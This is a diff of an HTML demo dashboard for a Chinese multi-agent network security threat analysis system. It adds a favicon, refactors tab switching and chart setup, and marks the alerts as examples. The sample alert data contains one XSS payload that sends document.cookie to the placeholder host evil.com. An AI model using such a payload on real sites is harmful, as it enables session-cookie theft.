@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>基于多智能体协同的网络安全威胁智能分析系统</title>
+    <link rel="icon" href="favicon.svg" type="image/svg+xml" />
+    <link rel="apple-touch-icon" href="favicon.svg" />
     <style>
         * {
             margin: 0;
@@ -21,6 +23,13 @@
         .container {
             max-width: 1400px;
             margin: 0 auto;
+        }
+
+        .site-mark {
+            width: 64px;
+            height: 64px;
+            display: block;
+            margin: 0 auto 14px;
         }
 
         header {
@@ -316,8 +325,10 @@
 <body>
     <div class="container">
         <header>
+            <img class="site-mark" src="favicon.svg" alt="" />
             <h1>基于多智能体协同的网络安全威胁智能分析系统</h1>
             <p class="subtitle">Multi-Agent Collaborative Network Security Threat Intelligent Analysis System</p>
+            <p class="subtitle">以下告警、指标和情报都是示例，不是真实流量。</p>
             <div style="margin-top: 20px;">
                 <span class="status status-online">系统运行中</span>
                 <span class="status status-processing" style="margin-left: 10px;">实时监控</span>
@@ -384,10 +395,10 @@
 
         <div class="analysis-section">
             <div class="tabs">
-                <button class="tab active" onclick="switchTab('realtime')">实时分析</button>
-                <button class="tab" onclick="switchTab('agents')">智能体状态</button>
-                <button class="tab" onclick="switchTab('statistics')">统计分析</button>
-                <button class="tab" onclick="switchTab('threat-intel')">威胁情报</button>
+                <button class="tab active" onclick="switchTab('realtime', this)">实时分析</button>
+                <button class="tab" onclick="switchTab('agents', this)">智能体状态</button>
+                <button class="tab" onclick="switchTab('statistics', this)">统计分析</button>
+                <button class="tab" onclick="switchTab('threat-intel', this)">威胁情报</button>
             </div>
 
             <div id="realtime" class="tab-content active">
@@ -476,7 +487,7 @@
         </footer>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
     <script>
         // 模拟告警数据
         const alertData = [
@@ -497,7 +508,7 @@
                 type: "XSS攻击",
                 source: "10.0.0.50",
                 target: "/comment",
-                payload: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+                payload: "<script>document.location='http://evil.com/steal?c='+document.cookie\u003c/script>",
                 time: "2025-01-13 09:19:42",
                 risk: 8.5,
                 riskLevel: "critical",
@@ -568,8 +579,7 @@
         ];
 
         // 切换标签页
-        function switchTab(tabName) {
-            // 移除所有活动状态
+        function switchTab(tabName, button) {
             document.querySelectorAll('.tab').forEach(tab => {
                 tab.classList.remove('active');
             });
@@ -577,8 +587,7 @@
                 content.classList.remove('active');
             });
 
-            // 激活选中的标签
-            event.target.classList.add('active');
+            (button || event.target).classList.add('active');
             document.getElementById(tabName).classList.add('active');
 
             // 如果是统计标签，初始化图表
@@ -670,8 +679,10 @@
         }
 
         // 初始化图表
+        let chartsReady = false;
         function initCharts() {
-            // 攻击类型分布图
+            if (chartsReady || typeof Chart !== "function") return;
+            chartsReady = true;
             const attackCtx = document.getElementById('attackChart').getContext('2d');
             new Chart(attackCtx, {
                 type: 'doughnut',
@@ -749,9 +760,7 @@
 
                 if (processed >= total) {
                     clearInterval(interval);
-                    setTimeout(() => {
-                        alert('批量处理完成！共处理1000条告警，耗时16.3秒');
-                    }, 500);
+                    progressBar.textContent = '完成';
                 }
             }, 300);
         }
